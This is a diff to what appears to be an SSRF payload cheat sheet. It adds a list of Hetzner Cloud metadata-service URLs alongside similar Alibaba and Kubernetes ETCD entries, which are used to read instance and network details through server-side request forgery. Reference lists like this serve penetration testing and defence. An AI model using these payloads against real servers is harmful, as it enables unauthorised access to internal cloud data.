@@ -805,6 +805,18 @@ http://100.100.100.200/latest/meta-data/instance-id
 http://100.100.100.200/latest/meta-data/image-id
 ```
 
+### SSRF URL for Hetzner Cloud
+
+```powershell
+http://169.254.169.254/hetzner/v1/metadata
+http://169.254.169.254/hetzner/v1/metadata/hostname
+http://169.254.169.254/hetzner/v1/metadata/instance-id
+http://169.254.169.254/hetzner/v1/metadata/public-ipv4
+http://169.254.169.254/hetzner/v1/metadata/private-networks
+http://169.254.169.254/hetzner/v1/metadata/availability-zone
+http://169.254.169.254/hetzner/v1/metadata/region
+```
+
 ### SSRF URL for Kubernetes ETCD
 
 Can contain API keys and internal ip and ports
